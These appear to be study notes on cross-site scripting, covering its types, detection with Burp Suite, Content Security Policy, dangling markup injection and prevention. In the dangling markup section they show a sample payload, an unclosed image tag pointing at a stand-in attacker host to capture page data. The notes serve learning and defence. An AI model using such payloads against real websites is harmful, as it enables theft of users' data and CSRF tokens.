# XSS
What is it?
* Attacker compromises interactions user has with vulnerable application
* Circumvent same origin policy designed to segregate different websites
* Manipulate vulnerable website so it return malicious JS to users

Detection
* Burp Suite's web vulnerability scanner
* Manually:
	* Test all entry points (URL parameters, HTTP headers)
	* Submit random alphanumeric values (8 chars, use Burp Intruder’s number payload) (Burp Intruder grep payload options to flag responses with that value)
	* Find location of reflection
	* Test out some payloads in Burp Repeater
	* Test in browser (just something simple like an alert)
	
Types
* Reflected: script comes from current HTTP request
* Stored: script comes from website’s DB
* DOM-Based: vulnerability in client-side code rather than server-side

* Difference between Reflected and Stored: Stored is more serious from a security perspective.

Scripting Contexts
* Especially relevant for reflected and stored
* Between HTML tags
* In HTML Tag attributes

Content Security Policy
* CSP is a browser mechanism that aims to mitigate the impact of CSS and other vulns
* Can often be circumvented often.

Dangling Markup Injection
* Used to capture data cross-domain when full XSS exploit impossible
   	* Often due to input filters
* Can capture sensitive info (including CSRF, which can be used to perform unauthorised actions on a users behalf)
* It's when you enter an unclosed tag, like:
   	* "><img src='//attacker-website.com?        

Prevention
* Filter/validate input on arrival
* Encode data on output => HTML, URL, JS and CSS encoding
* Use appropriate response headers
   	* Use content-type and X-content-type-options headers to ensure browsers interpret responses the way you intend
   	* CSP
* Whitelisting vs Blocklisting
   	* Input validation should use whitelisting
   	* Only enable safe protocols and block everything else.
* https://portswigger.net/web-security/cross-site-scripting/preventing

